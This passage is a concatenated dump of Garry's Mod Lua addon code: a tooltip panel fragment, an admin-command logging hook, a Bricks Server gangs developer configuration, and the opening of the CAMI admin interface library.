	self:UpdateTooltip()
end

function PANEL:OnCursorMoved()
	if not IsValid( Tooltip ) then return end

	local x, y = gui.MousePos()
	Tooltip:SetPos( x, y - Tooltip:GetTall() )
end

function PANEL:OnCursorExited()
	self:HideTooltip()
end

vgui.Register( "ItemStoreSlot", PANEL, "DModelPanel" )

--PATH addons/____plogs/lua/plogs_hooks/ulx.lua:
--[[
addons/lgos/lua/plogs_hooks/ulx.lua
--]]
plogs.Register('Админка', false)

plogs.AddHook('SAM.RanCommand', function(pl, cmd_name, args, cmd, result)
	if IsValid(pl) and pl:IsPlayer() then
		if result[1] and result[1][1] and IsValid(result[1][1]) and isentity(result[1][1]) and result[1][1]:IsPlayer() then
			plogs.PlayerLog(pl, 'Админка', pl:NameID() .. ' выполнил "' .. cmd_name .. '" аргумент "' .. table.concat(args, ' ') .. '". На игрока ' .. result[1][1]:NameID(), {
				['Name']	= pl:Name(),
				['SteamID']	= pl:SteamID(),
				['Target Name']	= result[1][1]:Name(),
				['Target SteamID']	= result[1][1]:SteamID(),
			})
		else
			plogs.PlayerLog(pl, 'Админка', pl:NameID() .. ' выполнил "' .. cmd_name .. '" аргумент "' .. table.concat(args, ' ') .. '"', {
				['Name']	= pl:Name(),
				['SteamID']	= pl:SteamID(),
			})
		end
	end
end)



--PATH addons/____bricks_gangs/lua/bricks_server/bricks_gangs/sh_devconfig.lua:
--[[
    !!WARNING!!
        ALL CONFIG IS DONE INGAME, DONT EDIT ANYTHING HERE
        Type !bricksserver ingame or use the f4menu
    !!WARNING!!
]]--

BRICKS_SERVER.DEVCONFIG.GangURLWhitelist = {
    "https://i.imgur.com/",
    "https://imgur.com/"
}

BRICKS_SERVER.DEVCONFIG.GangRankLimit = 15
BRICKS_SERVER.DEVCONFIG.GangPrinterServerTime = 0.1 -- The decimal to reduce the server time by for each server, e.g. 0.1 would make the added time 10% less for server 2 and 20% less for server 3.

BRICKS_SERVER.DEVCONFIG.GangNameCharMin = 5
BRICKS_SERVER.DEVCONFIG.GangNameCharMax = 30
BRICKS_SERVER.DEVCONFIG.GangIconCharLimit = 200
BRICKS_SERVER.DEVCONFIG.GangNextEditTime = 1
BRICKS_SERVER.DEVCONFIG.GangPermissions = {
    ["DepositMoney"] = { BRICKS_SERVER.Func.L( "gangDepositMoney" ), BRICKS_SERVER.Func.L( "gangBalance" ) },
    ["WithdrawMoney"] = { BRICKS_SERVER.Func.L( "gangWithdrawMoney" ), BRICKS_SERVER.Func.L( "gangBalance" ) },
    ["EditRoles"] = { BRICKS_SERVER.Func.L( "gangEditRoles" ), BRICKS_SERVER.Func.L( "gangSettings" ) },
    ["EditSettings"] = { BRICKS_SERVER.Func.L( "gangEditSettings" ), BRICKS_SERVER.Func.L( "gangSettings" ) },
    ["InvitePlayers"] = { BRICKS_SERVER.Func.L( "gangInvitePlayers" ), BRICKS_SERVER.Func.L( "gangManagement" ) },
    ["KickPlayers"] = { BRICKS_SERVER.Func.L( "gangKickPlayers" ), BRICKS_SERVER.Func.L( "gangManagement" ) },
    ["ChangePlayerRoles"] = { BRICKS_SERVER.Func.L( "gangChangeRank" ), BRICKS_SERVER.Func.L( "gangManagement" ) },
    ["PurchaseUpgrades"] = { BRICKS_SERVER.Func.L( "gangPurchaseUpgrades" ), BRICKS_SERVER.Func.L( "gangManagement" ) },
    ["EditInbox"] = { BRICKS_SERVER.Func.L( "gangAcceptDeclineInbox" ), BRICKS_SERVER.Func.L( "gangManagement" ) },
    ["SendMessages"] = { BRICKS_SERVER.Func.L( "gangSendChatMessages" ), BRICKS_SERVER.Func.L( "gangChatLower" ) }
}

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "associations" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangPermissions["RequestAssociations"] = { BRICKS_SERVER.Func.L( "gangAssociationSend" ), BRICKS_SERVER.Func.L( "gangAssociations" ) }
    BRICKS_SERVER.DEVCONFIG.GangPermissions["AcceptAssociations"] = { BRICKS_SERVER.Func.L( "gangAssociationAccept" ), BRICKS_SERVER.Func.L( "gangAssociations" ) }
end

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "storage" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangPermissions["DepositItem"] = { BRICKS_SERVER.Func.L( "gangDepositItems" ), BRICKS_SERVER.Func.L( "gangStorage" ) }
    BRICKS_SERVER.DEVCONFIG.GangPermissions["WithdrawItem"] = { BRICKS_SERVER.Func.L( "gangWithdrawItems" ), BRICKS_SERVER.Func.L( "gangStorage" ) }
    BRICKS_SERVER.DEVCONFIG.GangPermissions["ViewItem"] = { BRICKS_SERVER.Func.L( "gangViewStorage" ), BRICKS_SERVER.Func.L( "gangStorage" ) }
end

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "printers" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangPermissions["PurchasePrinters"] = { BRICKS_SERVER.Func.L( "gangPurchasePrinters" ), BRICKS_SERVER.Func.L( "gangPrinters" ) }
    BRICKS_SERVER.DEVCONFIG.GangPermissions["UpgradePrinters"] = { BRICKS_SERVER.Func.L( "gangUpgradePrinters" ), BRICKS_SERVER.Func.L( "gangPrinters" ) }
    BRICKS_SERVER.DEVCONFIG.GangPermissions["PlacePrinters"] = { BRICKS_SERVER.Func.L( "gangPlacePrinters" ), BRICKS_SERVER.Func.L( "gangPrinters" ) }

    BRICKS_SERVER.DEVCONFIG.GangPrinterSlots = 6
    BRICKS_SERVER.DEVCONFIG.GangPrinterW = 807*0.8
    BRICKS_SERVER.DEVCONFIG.GangPrinterH = 1018*0.8
end

BRICKS_SERVER.DEVCONFIG.GangUpgrades = {
    ["MaxMembers"] = {
        Name = BRICKS_SERVER.Func.L( "gangMaxMembers" ),
        Format = function( reqInfo )
            return (reqInfo[1] or 0) .. " " .. BRICKS_SERVER.Func.L( "gangMembers" )
        end,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangMembers" ), "integer" }
        }
    },
    ["MaxBalance"] = { 
        Name = BRICKS_SERVER.Func.L( "gangMaxBalance" ), 
        Format = function( reqInfo )
            return DarkRP.formatMoney( reqInfo[1] or 0 )
        end,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangBalance" ), "integer" }
        }
    },
    ["Health"] = { 
        Name = BRICKS_SERVER.Func.L( "gangIncreasedHealth" ), 
        Format = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangXHP", (reqInfo[1] or 0) )
        end,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangExtraHealth" ), "integer" }
        }
    },
    ["Armor"] = { 
        Name = BRICKS_SERVER.Func.L( "gangIncreasedArmor" ), 
        Format = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangXAP", (reqInfo[1] or 0) )
        end,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangExtraArmor" ), "integer" }
        }
    },
    ["Salary"] = { 
        Name = BRICKS_SERVER.Func.L( "gangIncreasedSalary" ), 
        Format = function( reqInfo )
            return "+" .. DarkRP.formatMoney( reqInfo[1] or 0 )
        end,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangExtraSalary" ), "integer" }
        }
    },
    ["Weapon"] = { 
        Name = BRICKS_SERVER.Func.L( "gangPermWeapon" ), 
        Unlimited = true,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangWeapon" ), "table", "weapons" }
        }
    }
}

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "storage" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangUpgrades["StorageSlots"] = { 
        Name = BRICKS_SERVER.Func.L( "gangStorageSlots" ), 
        Format = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangXSlots", (reqInfo[1] or 0) )
        end,
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangSlots" ), "integer" }
        }
    }
end

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "achievements" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangAchievements = {
        ["Balance"] = {
            Name = BRICKS_SERVER.Func.L( "gangBalanceFull" ),
            Format = function( progress, goal )
                return DarkRP.formatMoney( progress ) .. "/" .. DarkRP.formatMoney( goal )
            end,
            GetProgress = function( gangTable )
                return gangTable.Money or 0
            end,
            GetGoal = function( reqInfo )
                return reqInfo[1] or 0
            end,
            ReqInfo = {
                [1] = { BRICKS_SERVER.Func.L( "gangBalance" ), "integer" }
            }
        },
        ["Members"] = {
            Name = BRICKS_SERVER.Func.L( "gangMembersFull" ),
            Format = function( progress, goal )
                return progress .. "/" .. goal .. " " .. BRICKS_SERVER.Func.L( "gangMembers" )
            end,
            GetProgress = function( gangTable )
                return table.Count( gangTable.Members or {} )
            end,
            GetGoal = function( reqInfo )
                return reqInfo[1] or 0
            end,
            ReqInfo = {
                [1] = { BRICKS_SERVER.Func.L( "gangMembers" ), "integer" }
            }
        },
        ["Level"] = {
            Name = BRICKS_SERVER.Func.L( "gangLevel" ),
            Format = function( progress, goal )
                return BRICKS_SERVER.Func.L( "level" ) .. " " .. progress .. "/" .. goal
            end,
            GetProgress = function( gangTable )
                return gangTable.Level or 0
            end,
            GetGoal = function( reqInfo )
                return reqInfo[1] or 0
            end,
            ReqInfo = {
                [1] = { BRICKS_SERVER.Func.L( "level" ), "integer" }
            }
        }
    }

    if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "storage" ) ) then
        BRICKS_SERVER.DEVCONFIG.GangAchievements["Storage"] = {
            Name = BRICKS_SERVER.Func.L( "gangStorageFull" ),
            Format = function( progress, goal )
                return progress .. "/" .. goal .. " " .. BRICKS_SERVER.Func.L( "gangItems" )
            end,
            GetProgress = function( gangTable )
                local itemCount = 0
                for k, v in pairs( gangTable.Storage or {} ) do
                    itemCount = itemCount+(v[1] or 0)
                end

                return itemCount
            end,
            GetGoal = function( reqInfo )
                return reqInfo[1] or 0
            end,
            ReqInfo = {
                [1] = { BRICKS_SERVER.Func.L( "gangItems" ), "integer" }
            }
        }
    end
end

BRICKS_SERVER.DEVCONFIG.GangNotifications = {
    ["GangInvite"] = {
        Name = BRICKS_SERVER.Func.L( "gangInvite" ),
        ReqInfo = {
            [1] = { "InviterGangID", "integer" },
            [2] = { "InviterGangName", "string" }
        },
        FormatDescription = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangInviteReceivedInbox", reqInfo[2] )
        end,
        AcceptFunc = function( reqInfo ) 
            net.Start( "BRS.Net.GangInviteAccept" )
                net.WriteUInt( reqInfo[1], 16 )
            net.SendToServer()
        end
    },
    ["AssociationInvite"] = {
        Name = BRICKS_SERVER.Func.L( "gangAssociationInvite" ),
        ReqInfo = {
            [1] = { "InviterGangID", "integer" },
            [2] = { "InviterGangName", "string" },
            [3] = { "AssociationType", "string" }
        },
        FormatDescription = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangAssociationInviteInbox", reqInfo[2], reqInfo[3] )
        end,
        AcceptFunc = function( reqInfo ) 
            net.Start( "BRS.Net.AcceptGangAssociation" )
                net.WriteUInt( reqInfo[1], 16 )
            net.SendToServer()
        end
    },
    ["AssociationCreated"] = {
        Name = BRICKS_SERVER.Func.L( "gangAssociationCreated" ),
        ReqInfo = {
            [1] = { "OtherGangID", "integer" },
            [2] = { "OtherGangName", "string" },
            [3] = { "AssociationType", "string" }
        },
        FormatDescription = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangAssociationCreatedInbox", reqInfo[3], reqInfo[2] )
        end
    },
    ["AssociationDissolved"] = {
        Name = BRICKS_SERVER.Func.L( "gangAssociationDissolved" ),
        ReqInfo = {
            [1] = { "OtherGangID", "integer" },
            [2] = { "OtherGangName", "string" }
        },
        FormatDescription = function( reqInfo )
            return BRICKS_SERVER.Func.L( "gangAssociationDissolvedInbox", reqInfo[2] )
        end
    },
    ["AdminMail"] = {
        Name = BRICKS_SERVER.Func.L( "gangAdminNotification" ),
        ReqInfo = {
            [1] = { "Header", "string" },
            [2] = { "Description", "string" }
        },
        FormatHeader = function( reqInfo )
            return reqInfo[1]
        end,
        FormatDescription = function( reqInfo )
            return reqInfo[2]
        end
    },
    ["Achievement"] = {
        Name = BRICKS_SERVER.Func.L( "gangInboxAchievement" ),
        ReqInfo = {
            [1] = { "Achievement Key", "integer" }
        },
        FormatDescription = function( reqInfo )
            local achievementConfig = BRICKS_SERVER.CONFIG.GANGS.Achievements[reqInfo[1]]

            return BRICKS_SERVER.Func.L( "gangInboxAchievementCompleted", achievementConfig.Name )
        end
    },
    ["AchievementReward"] = {
        Name = BRICKS_SERVER.Func.L( "gangInboxAchievement" ),
        ReqInfo = {
            [1] = { "Achievement Key", "integer" },
            [2] = { "Achievement Rewards", "table" }
        },
        FormatDescription = function( reqInfo )
            local rewardString = ""
            for k, v in pairs( reqInfo[2] or {} ) do
                local devConfigReward = BRICKS_SERVER.DEVCONFIG.GangRewards[k]

                if( not devConfigReward ) then continue end

                if( rewardString == "" ) then
                    rewardString =  devConfigReward.FormatDescription( v )
                else
                    rewardString = rewardString .. ", " .. devConfigReward.FormatDescription( v )
                end
            end

            local achievementConfig = BRICKS_SERVER.CONFIG.GANGS.Achievements[reqInfo[1]]

            return BRICKS_SERVER.Func.L( "gangInboxAchievementCompletedReward", achievementConfig.Name, rewardString )
        end,
        AcceptFunc = function( reqInfo, inboxKey ) 
            net.Start( "BRS.Net.GangAchievementClaim" )
                net.WriteUInt( inboxKey, 16 )
            net.SendToServer()
        end
    }
}

BRICKS_SERVER.DEVCONFIG.GangRewards = {
    ["GangExperience"] = {
        Name = BRICKS_SERVER.Func.L( "gangExperienceFull" ),
        Color = Color( 22, 160, 133 ),
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "experience" ), "integer" }
        },
        FormatDescription = function( reqInfo )
            return BRICKS_SERVER.Func.FormatGangEXP( reqInfo[1] or 0 ) .. " " .. BRICKS_SERVER.Func.L( "exp" )
        end,
        RewardFunc = function( gangID, reqInfo )
            BRICKS_SERVER.Func.AddGangExperience( gangID, reqInfo[1] )

            return true
        end
    },
    ["GangBalance"] = {
        Name = BRICKS_SERVER.Func.L( "gangBalanceFull" ),
        Color = Color( 39, 174, 96 ),
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "money" ), "integer" }
        },
        FormatDescription = function( reqInfo )
            return DarkRP.formatMoney( reqInfo[1] or 0 )
        end,
        RewardFunc = function( gangID, reqInfo )
            BRICKS_SERVER.Func.AddGangBalance( gangID, reqInfo[1] )
        end
    }
}

hook.Add("bWhitelist:Init", "BricksServerHooks_bWhitelist:Init_Gang", function()
    BRICKS_SERVER.DEVCONFIG.GangRewards["bWhitelist"] = {
        Name = BRICKS_SERVER.Func.L( "gangJobWhitelist" ),
        Temporary = true,
        Color = Color( 52, 152, 219 ),
        ReqInfo = {
            [1] = { BRICKS_SERVER.Func.L( "gangJobs" ), "custom", function( rewardTable, rewardKey, reqInfoKey, currentReqInfo )
                BRICKS_SERVER.Func.CreateTeamSelector( (currentReqInfo or {}), BRICKS_SERVER.Func.L( "gangJobsSelect" ), function( teamTable ) 
                    if( table.Count( teamTable ) > 0 ) then
                        rewardTable[rewardKey] = rewardTable[rewardKey] or {}
                        rewardTable[rewardKey][reqInfoKey] = teamTable
                    else
                        rewardTable[rewardKey] = nil
                    end
                end, function() end )
            end }
        },
        FormatDescription = function( reqInfo )
            local jobString = ""
            for k, v in pairs( reqInfo[1] or {} ) do
                for key, val in pairs( RPExtraTeams ) do
                    if( val.command == k ) then
                        if( jobString == "" ) then
                            jobString = val.name
                        else
                            jobString = jobString .. ", " .. val.name
                        end
                        break
                    end
                end
            end

            return jobString
        end,
        RewardFunc = function( gangID, reqInfo )
            local teams = {}
            for k, v in pairs( reqInfo[1] or {} ) do
                for key, val in pairs( RPExtraTeams ) do
                    if( val.command == k ) then
                        table.insert( teams, k )
                        break
                    end
                end
            end

            local gangTable = (BRICKS_SERVER_GANGS or {})[gangID] or {}

            for k, v in pairs( teams ) do
                for key, val in pairs( gangTable.Members ) do
                    GAS.JobWhitelist:AddToWhitelist( v, GAS.JobWhitelist.LIST_TYPE_STEAMID, key )
                end
            end

            return true
        end,
        UnRewardFunc = function( gangID, reqInfo )
            local teams = {}
            for k, v in pairs( reqInfo[1] or {} ) do
                for key, val in pairs( RPExtraTeams ) do
                    if( val.command == k ) then
                        table.insert( teams, k )
                        break
                    end
                end
            end

            local gangTable = (BRICKS_SERVER_GANGS or {})[gangID] or {}

            for k, v in pairs( teams ) do
                for key, val in pairs( gangTable.Members ) do
                    GAS.JobWhitelist:RemoveFromWhitelist( v, GAS.JobWhitelist.LIST_TYPE_STEAMID, key )
                end
            end

            return true
        end
    }
end )

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "leaderboards" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangLeaderboards = {
        ["Experience"] = {
            Name = BRICKS_SERVER.Func.L( "experience" ),
            Color = Color( 22, 160, 133 ),
            FormatDescription = function( value )
                return BRICKS_SERVER.Func.FormatGangEXP( value or 0 ) .. " " .. BRICKS_SERVER.Func.L( "exp" )
            end,
            GetSortValue = function( gangTable )
                return gangTable.Experience or 0
            end
        },
        ["Members"] = {
            Name = BRICKS_SERVER.Func.L( "gangMembers" ),
            Color = Color( 41, 128, 185 ),
            FormatDescription = function( value )
                return (value or 0) .. " " .. (((value or 0) != 1 and BRICKS_SERVER.Func.L( "gangMembers" )) or BRICKS_SERVER.Func.L( "gangMember" ))
            end,
            GetSortValue = function( gangTable )
                return table.Count( gangTable.Members or {} )
            end
        },
        ["Balance"] = {
            Name = BRICKS_SERVER.Func.L( "gangBalance" ),
            Color = Color( 39, 174, 96 ),
            FormatDescription = function( value )
                return DarkRP.formatMoney( value or 0 )
            end,
            GetSortValue = function( gangTable )
                return gangTable.Money or 0
            end
        }
    }

    if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "storage" ) ) then
        BRICKS_SERVER.DEVCONFIG.GangLeaderboards["StorageItems"] = {
            Name = BRICKS_SERVER.Func.L( "gangStorageItems" ),
            Color = Color( 231, 76, 60 ),
            FormatDescription = function( value )
                return (value or 0) .. " " .. (((value or 0) != 1 and BRICKS_SERVER.Func.L( "gangItems" )) or BRICKS_SERVER.Func.L( "gangItem" ))
            end,
            GetSortValue = function( gangTable )
                return table.Count( gangTable.Storage or {} )
            end
        }
    end
end

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "associations" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangAssociationTypes = {
        ["Allies"] = {
            Icon = "flag.png",
            Color = Color( 52, 152, 219 ),
            Query = BRICKS_SERVER.Func.L( "gangAllyRequest" )
        },
        ["War"] = {
            Icon = "gang_war.png",
            Color = Color( 231, 76, 60 ),
            Query = BRICKS_SERVER.Func.L( "gangWarRequest" )
        },
    }
end

BRICKS_SERVER.DEVCONFIG.GangAdminCmds = {
    [1] = {
        Name = BRICKS_SERVER.Func.L( "gangSetLevel" ),
        Icon = "levelling.png",
        ReqInfo = {
            [1] = { "Level", "integer", false, BRICKS_SERVER.Func.L( "gangSetLevelQuery" ) }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            local newLevel = math.Clamp( reqInfo[1] or (gangTable.Level or 0), 0, BRICKS_SERVER.CONFIG.GANGS["Max Level"] )
            BRICKS_SERVER.Func.SetGangLevel( gangID, newLevel )
            BRICKS_SERVER.Func.SetGangExperience( gangID, BRICKS_SERVER.Func.GetGangExpToLevel( 0, newLevel ) )
            return BRICKS_SERVER.Func.L( "gangSetLevelMsg", (gangTable.Name or "NIL"), newLevel )
        end
    },
    [2] = {
        Name = BRICKS_SERVER.Func.L( "gangAddExperience" ),
        Icon = "gang_experience.png",
        ReqInfo = {
            [1] = { "Experience", "integer", false, BRICKS_SERVER.Func.L( "gangAddExperienceQuery" ) }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            local experience = reqInfo[1] or (gangTable.Experience or 0)
            BRICKS_SERVER.Func.AddGangExperience( gangID, experience )
            return BRICKS_SERVER.Func.L( "gangAddExperienceMsg", BRICKS_SERVER.Func.FormatGangEXP( experience ), (gangTable.Name or "NIL") )
        end
    },
    [3] = {
        Name = BRICKS_SERVER.Func.L( "gangSetBalance" ),
        Icon = "balance.png",
        ReqInfo = {
            [1] = { "Money", "integer", false, BRICKS_SERVER.Func.L( "gangSetBalanceQuery" ) }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            local newBalance = reqInfo[1] or (gangTable.Money or 0)
            BRICKS_SERVER.Func.SetGangBalance( gangID, newBalance )
            return BRICKS_SERVER.Func.L( "gangSetBalanceMsg", (gangTable.Name or "NIL"), DarkRP.formatMoney( newBalance ) )
        end
    },
    [4] = {
        Name = BRICKS_SERVER.Func.L( "gangAddBalance" ),
        Icon = "gang_add_money.png",
        ReqInfo = {
            [1] = { "Money", "integer", false, BRICKS_SERVER.Func.L( "gangAddBalanceQuery" ) }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            local addBalance = reqInfo[1] or 0
            BRICKS_SERVER.Func.AddGangBalance( gangID, addBalance )
            return BRICKS_SERVER.Func.L( "gangAddBalanceMsg", DarkRP.formatMoney( addBalance ), (gangTable.Name or "NIL") )
        end
    },
    [5] = {
        Name = BRICKS_SERVER.Func.L( "gangViewMembers" ),
        Icon = "gang_viewmembers.png",
        ClientFunc = function( gangTable, gangID, panel )
            panel:ViewMembers()
        end
    },
    [6] = { -- Kick member
        ReqInfo = {
            [1] = { "MemberSteamID", "string" }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            if( gangTable.Owner == reqInfo[1] ) then
                return BRICKS_SERVER.Func.L( "gangCantKickOwner" )
            end

            local success = BRICKS_SERVER.Func.GangKickMember( gangID, reqInfo[1] )

            return (success and BRICKS_SERVER.Func.L( "gangKickSuccessAdmin" )) or BRICKS_SERVER.Func.L( "gangKickFailAdmin" )
        end
    },
    [7] = { -- Set member rank
        ReqInfo = {
            [1] = { "MemberSteamID", "string" },
            [2] = { "NewRank", "integer" }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            local success = BRICKS_SERVER.Func.GangMemberSetRank( gangID, reqInfo[1], reqInfo[2] )

            return (success and BRICKS_SERVER.Func.L( "gangSetRankSuccessAdmin" )) or BRICKS_SERVER.Func.L( "gangSetRankFailAdmin" )
        end
    },
    [8] = { -- Transfer ownership
        ReqInfo = {
            [1] = { "MemberSteamID", "string" }
        },
        ServerFunc = function( gangTable, gangID, reqInfo )
            if( gangTable.Owner == reqInfo[1] ) then
                return BRICKS_SERVER.Func.L( "gangMemberAlreadyOwner" )
            end

            if( not gangTable.Members or not gangTable.Members[reqInfo[1]] ) then 
                return BRICKS_SERVER.Func.L( "gangNotMember" )
            end
        
            BRICKS_SERVER.Func.UpdateGangTable( gangID, "Owner", reqInfo[1] )

            return BRICKS_SERVER.Func.L( "gangOwnershipTransferedAdmin" )
        end
    },
    [9] = {
        Name = BRICKS_SERVER.Func.L( "delete" ),
        Icon = "gang_delete.png",
        ClientFunc = function( gangTable, gangID, panel )
            BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "gangDeleteAdminQuery", string.upper( gangTable.Name or "" ) ), "", function( text ) 
                if( text == string.upper( gangTable.Name ) ) then
                    net.Start( "BRS.Net.AdminGangCMD" )
                        net.WriteUInt( 9, 8 )
                        net.WriteUInt( gangID, 16 )
                        net.WriteTable( {} )
                    net.SendToServer()
                end
            end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
        end,
        ServerFunc = function( gangTable, gangID, reqInfo )
            BRICKS_SERVER.Func.DeleteGangTable( gangID )

            return BRICKS_SERVER.Func.L( "gangDeleteSuccessAdmin", gangTable.Name )
        end
    }
}

if( BRICKS_SERVER.Func.IsSubModuleEnabled( "gangs", "printers" ) ) then
    BRICKS_SERVER.DEVCONFIG.GangServerUpgradeTypes = {
        ["Cooling"] = {
            Name = "Cooling",
            Icon = Material( "bricks_server/gangprinter_upgrade_cooling.png" ),
            Tiered = true,
            ReqInfo = {
                [1] = { "Temperature Decrease", "integer" }
            },
            SetFunc = function( ent, server, tier, upgradeConfig )
                ent:SetNW2Int( "CoolingServer" .. server, tier )

                if( tier >= #upgradeConfig.Tiers*0.5 ) then
                    ent:SetBodygroup( 8+((server-1)*2), 1 )

                    if( tier >= #upgradeConfig.Tiers ) then
                        ent:SetBodygroup( 8+((server-1)*2)+1, 1 )
                    end
                end
            end,
            GetFunc = function( ent, server )
                return ent:GetNW2Int( "CoolingServer" .. server, 0 )
            end
        },
        ["Speed"] = {
            Name = "Speed",
            Icon = Material( "bricks_server/gangprinter_upgrade_speed.png" ),
            Tiered = true,
            ReqInfo = {
                [1] = { "Speed Increase", "integer" }
            },
            SetFunc = function( ent, server, tier, upgradeConfig )
                ent:SetNW2Int( "SpeedServer" .. server, tier )
            end,
            GetFunc = function( ent, server )
                return ent:GetNW2Int( "SpeedServer" .. server, 0 )
            end
        },
        ["Amount"] = {
            Name = "Amount",
            Icon = Material( "bricks_server/gangprinter_upgrade_amount.png" ),
            Tiered = true,
            ReqInfo = {
                [1] = { "Amount Increase", "integer" }
            },
            SetFunc = function( ent, server, tier, upgradeConfig )
                ent:SetNW2Int( "AmountServer" .. server, tier )
            end,
            GetFunc = function( ent, server )
                return ent:GetNW2Int( "AmountServer" .. server, 0 )
            end
        }
    }

    BRICKS_SERVER.DEVCONFIG.GangPrinterUpgradeTypes = {
        ["Health"] = {
            Name = "Health",
            Icon = Material( "bricks_server/gangprinter_upgrade_health.png" ),
            Tiered = true,
            ReqInfo = {
                [1] = { "Health Increase", "integer" }
            },
            SetFunc = function( ent, value )
                ent:SetNW2Int( "HealthUpgrade", value )
            end,
            GetFunc = function( ent )
                return ent:GetNW2Int( "HealthUpgrade", 0 )
            end
        },
        ["RGB"] = {
            Name = "RGB",
            SetFunc = function( ent, value )
                ent:SetNW2Bool( "RGBUpgrade", true )

                ent:SetBodygroup( 7, 1 )
            end,
            GetFunc = function( ent )
                return ent:GetNW2Bool( "RGBUpgrade", false )
            end
        }
    }
end

BRICKS_SERVER.DEVCONFIG.PresetGangIcons = {
    "bricks_server/gang_viewmembers.png",
    "bricks_server/gang_add_money.png",
    "bricks_server/storage_64.png"
}

-- 1: sql key (set to false to not save to DB), 2: data type
BRICKS_SERVER.DEVCONFIG.GangTableKeys = {
    ["Name"] = { "gangName", "string" },
    ["Icon"] = { "gangIcon", "string" },
    ["Owner"] = { "owner", "string" },
    ["Level"] = { "level", "integer" },
    ["Experience"] = { "experience", "integer" },
    ["Money"] = { "money", "integer" },
    ["Storage"] = { "storage", "table" },
    ["Members"] = { "members", "table" },
    ["Roles"] = { "roles", "table" },
    ["Upgrades"] = { "upgrades", "table" },
    ["Achievements"] = { "achievements", "table" },
    ["Printers"] = { false, "table" },
}

BRICKS_SERVER.DEVCONFIG.NPCTypes = BRICKS_SERVER.DEVCONFIG.NPCTypes or {}
BRICKS_SERVER.DEVCONFIG.NPCTypes["Gang"] = {
    UseFunction = function( ply, ent, NPCKey )
        BRICKS_SERVER.Func.OpenGangMenu( ply )
    end
}

BRICKS_SERVER.DEVCONFIG.EntityTypes = BRICKS_SERVER.DEVCONFIG.EntityTypes or {}
BRICKS_SERVER.DEVCONFIG.EntityTypes["bricks_server_territory"] = { 
    GetDataFunc = function( entity ) 
        return entity:GetTerritoryKey() or 0
    end,
    SetDataFunc = function( entity, data ) 
        return entity:SetTerritoryKeyFunc( data or 0 )
    end
}
--PATH addons/____esclib/lua/elib/essentials/libs/esc_cami.lua:
--[[
CAMI - Common Admin Mod Interface.
Copyright 2020 CAMI Contributors

Makes admin mods intercompatible and provides an abstract privilege interface
for third party addons.

Follows the specification on this page:
https://github.com/glua/CAMI/blob/master/README.md

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
]]

-- Version number in YearMonthDay format.
local version = 20211019

if CAMI and CAMI.Version >= version then return end

CAMI = CAMI or {}
CAMI.Version = version


--- @class CAMI_USERGROUP
--- defines the charactaristics of a usergroup
--- @field Name string @The name of the usergroup
--- @field Inherits string @The name of the usergroup this usergroup inherits from
--- @field CAMI_Source string @The source specified by the admin mod which registered this usergroup (if any, converted to a string)

--- @class CAMI_PRIVILEGE
--- defines the charactaristics of a privilege
--- @field Name string @The name of the privilege
--- @field MinAccess "'user'" | "'admin'" | "'superadmin'" @Default group that should have this privilege
--- @field Description string | nil @Optional text describing the purpose of the privilege
local CAMI_PRIVILEGE = {}
--- Optional function to check if a player has access to this privilege
--- (and optionally execute it on another player)
---
--- ⚠ **Warning**: This function may not be called by all admin mods
--- @param actor GPlayer @The player
--- @param target GPlayer | nil @Optional - the target
--- @return boolean @If they can or not
